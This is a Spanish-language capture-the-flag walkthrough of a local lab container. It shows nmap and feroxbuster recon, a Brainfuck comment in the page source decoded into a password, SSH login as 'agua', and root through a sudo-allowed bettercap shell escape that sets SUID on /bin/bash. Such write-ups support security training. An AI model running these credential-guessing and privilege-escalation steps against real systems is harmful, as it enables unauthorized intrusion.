# Escaneo de Puertos, Servicios y Versiones


`nmap -Pn -n -sS -p- --open -sCV --min-rate 5000 172.17.0.2 -oN nmap`
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-30 14:24 -03
Nmap scan report for 172.17.0.2
Host is up (0.0000020s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey: 
|   256 75:ec:4d:36:12:93:58:82:7b:62:e3:52:91:70:83:70 (ECDSA)
|_  256 8f:d8:0f:2c:4b:3e:2b:d7:3c:a2:83:d3:6d:3f:76:aa (ED25519)
80/tcp open  http    Apache httpd 2.4.59 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.59 (Debian)
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.22 seconds
```


como esta el puerto 80 levantado, realizare fuzzing web

# Fuzzing Web


`feroxbuster -u http://172.17.0.2 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -s 200,301,302 -x txt,php,bak,db,py,html,js,jpg,png -t 200 -d 10 --random-agent --methods GET,POST`

```
___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://172.17.0.2
 🚀  Threads               │ 200
 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
 👌  Status Codes          │ [200, 301, 302]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ Random
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [txt, php, bak, db, py, html, js, jpg, png]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 10
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
301      GET        9l       28w      309c http://172.17.0.2/images => http://172.17.0.2/images/
200      GET       24l      127w    10355c http://172.17.0.2/icons/openlogo-75.png
200      GET      521l      936w    11142c http://172.17.0.2/
200      GET      215l      927w    91172c http://172.17.0.2/images/agua_ssh.jpg
200      GET      521l      936w    11142c http://172.17.0.2/index.html
[####################] - 4m   2076360/2076360 0s      found:5       errors:2316   
[####################] - 4m   2076290/2076290 8624/s  http://172.17.0.2/ 
[####################] - 0s   2076290/2076290 79857308/s http://172.17.0.2/images/ => Directory listing (add --scan-dir-listings to scan)   
```


no veo nada de interes a primera vista asi que procedo a chequear desde el navegador y despues de inspeccionar el codigo fuente me consigo con el siguiente comentario:


```
<!--
++++++++++[>++++++++++>++++++++++>++++++++++>++++++++++>++++++++++>++++++++++>++++++++++++>++++++++++>+++++++++++>++++++++++++>++++++++++>++++++++++++>++++++++++>+++++++++++>+++++++++++>+>+<<<<<<<<<<<<<<<<<-]>--.>+.>--.>+.>---.>+++.>---.>---.>+++.>---.>+..>-----..>---.>.>+.>+++.>.
-->
```

y resulta ser Brainfuck, un lenguaje de programacion esoterico asi que busco un decoder en internet y obtengo el siguiente resultado

![Screenshot From 2024-10-30 14-51-08](https://github.com/user-attachments/assets/0c14f799-dafe-41d3-85ae-8615ada829c1)


lo que parece ser una password: bebeaguaqueessano
ahora me descargo la imagen que nos reporta feroxbuster que por lo visto tiene algo que ver con ssh

```
curl -O http://172.17.0.2/images/agua_ssh.jpg                          
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 50517  100 50517    0     0  36.0M      0 --:--:-- --:--:-- --:--:-- 48.1M

```

examino la imagen a ver si en los metadatos consigo algo o asi tiene incrustado un archivo pero nada de esto tiene resultado... asi que comienzo a probar por ssh diferentes user con la password: bebeaguaqueessano y obtengo resultados con el user agua

# Escalada de Privilegios

```
ssh agua@172.17.0.2      
The authenticity of host '172.17.0.2 (172.17.0.2)' can't be established.
ED25519 key fingerprint is SHA256:EZNhR2ojYOvInwAg+dpLntRab/b7eRvr60vq3sn7hH8.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '172.17.0.2' (ED25519) to the list of known hosts.
agua@172.17.0.2's password: 
Linux 2e557505bef6 6.11.2-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.11.2-1kali1 (2024-10-15) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue May 14 17:41:58 2024 from 172.17.0.1
agua@2e557505bef6:~$ sudo -l
Matching Defaults entries for agua on 2e557505bef6:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User agua may run the following commands on 2e557505bef6:
    (root) NOPASSWD: /usr/bin/bettercap
agua@2e557505bef6:~$ 
```

por lo visto podemos hacer uso del binario /usr/bin/bettercap como root, asi que lo ejecuto y despliego la ayuda

```
agua@2e557505bef6:~$ sudo /usr/bin/bettercap
bettercap v2.32.0 (built for linux amd64 with go1.19.8) [type 'help' for a list of commands]

172.17.0.0/16 > 172.17.0.2  » [18:30:45] [sys.log] [war] exec: "ip": executable file not found in $PATH
172.17.0.0/16 > 172.17.0.2  » help

           help MODULE : List available commands or show module specific help if no module name is provided.
                active : Show information about active modules.
                  quit : Close the session and exit.
         sleep SECONDS : Sleep for the given amount of seconds.
              get NAME : Get the value of variable NAME, use * alone for all, or NAME* as a wildcard.
        set NAME VALUE : Set the VALUE of variable NAME.
  read VARIABLE PROMPT : Show a PROMPT to ask the user for input that will be saved inside VARIABLE.
                 clear : Clear the screen.
        include CAPLET : Load and run this caplet in the current session.
             ! COMMAND : Execute a shell command and print its output.
        alias MAC NAME : Assign an alias to a given endpoint given its MAC address.

Modules

      any.proxy > not running
       api.rest > not running
      arp.spoof > not running
      ble.recon > not running
             c2 > not running
        caplets > not running
    dhcp6.spoof > not running
      dns.spoof > not running
  events.stream > running
            gps > not running
            hid > not running
     http.proxy > not running
    http.server > not running
    https.proxy > not running
   https.server > not running
    mac.changer > not running
    mdns.server > not running
   mysql.server > not running
      ndp.spoof > not running
      net.probe > not running
      net.recon > not running
      net.sniff > not running
   packet.proxy > not running
       syn.scan > not running
      tcp.proxy > not running
         ticker > not running
             ui > not running
         update > not running
           wifi > not running
            wol > not running

172.17.0.0/16 > 172.17.0.2  »
```

aqui veo la opcion para ejecutar comandos con el parametro ! [comando], asi que le agrego el bit suid al binario /bin/bash

```
172.17.0.0/16 > 172.17.0.2  » ! chmod u+s /bin/bash
172.17.0.0/16 > 172.17.0.2  » ! ls -la /bin/bash
-rwsr-xr-x 1 root root 1265648 Apr 23  2023 /bin/bash
172.17.0.0/16 > 172.17.0.2  »
```

salgo de bettercap y realizo la escalada a root

```
agua@2e557505bef6:~$ /bin/bash -p
bash-5.2# whoami
root
bash-5.2# id
uid=1000(agua) gid=1000(agua) euid=0(root) groups=1000(agua),104(lxd)
bash-5.2# 
```
